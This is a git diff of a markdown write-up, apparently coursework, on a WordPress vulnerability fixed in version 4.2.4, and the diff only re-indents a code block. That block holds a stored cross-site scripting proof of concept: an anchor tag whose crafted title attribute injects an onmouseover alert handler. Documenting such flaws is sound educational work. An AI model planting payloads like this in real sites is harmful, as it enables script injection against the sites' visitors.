@@ -24,12 +24,11 @@ Time spent: **10** hours spent in total
     - Fixed in version: 4.2.4
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate:
-    <code>
+<code>
       
-        <a href='/wp-admin/' title="onclick='" Title='" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;"  onmouseover=alert(1)//'>Test</a>
+    <a href='/wp-admin/' title="onclick='" Title='" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;"  onmouseover=alert(1)//'>Test</a>
       
-    </code>
-  
+</code>
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 ### 3. (Required) Vulnerability Name or ID
